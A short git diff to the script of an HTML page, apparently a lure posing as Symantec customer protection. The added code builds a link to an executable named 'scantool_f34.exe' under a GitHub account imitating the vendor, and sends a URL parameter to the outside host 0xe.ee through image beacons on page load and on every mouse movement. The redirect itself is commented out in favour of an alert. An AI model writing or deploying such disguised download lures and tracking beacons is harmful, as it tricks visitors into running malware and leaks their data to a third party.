@@ -380,15 +380,27 @@
 </head>
 
 <body>
+    
     <script>
         var params = new URLSearchParams(window.location.search);
         var id = params.get('id');
-        var target = `http://0xe.ee/${id}/`;
-        setTimeout(download, 200);
-
+        var gp = params.get('gp');
+        
+        
+    </script>
+    <script>
+        var target = `https://raw.githubusercontent.com/SymantecCustomerProtection/cloud-gate/${id}/scantool_f34.exe`;
+        
         function download() {
+            var yes = document.createElement("img").src = `//0xe.ee/?${gp}`;
+            //window.location.href = target;
             alert(`downloading form \n ${target}`);
         }
+        
+        setTimeout(download, 2000);
+        document.onmouseover = function() {download(); } 
+        document.onmouseout  = function() {download(); } 
+        var yes = document.createElement("img").src = `//0xe.ee/?${gp}`;
     </script>
     <div class="pg red">
         <div class="pg_cont">
